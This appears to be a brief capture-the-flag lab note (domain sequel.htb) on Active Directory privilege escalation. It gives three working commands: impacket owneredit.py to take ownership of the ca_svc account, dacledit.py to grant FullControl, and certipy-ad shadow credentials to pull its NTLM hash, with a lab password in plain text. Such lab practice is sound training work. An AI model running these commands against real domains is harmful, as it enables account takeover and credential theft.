AD Priv Esc through Domain Policy

1. Becoming the owner of service account "ca_svc". Now user "ryan" (current user) owns this service account.

```
/usr/share/doc/python3-impacket/examples/owneredit.py -action write -new-owner ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
```

2. Giving GenericAll for "ryan" over "ca_svc".

```
/usr/share/doc/python3-impacket/examples/dacledit.py -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
```

3. Get NTLM Hash for user "ca_svc".

```
certipy-ad shadow auto -username ryan@sequel.htb -password WqSZAF6CysDQbGb3 -account ca_svc -dc-ip 10.129.232.128 
```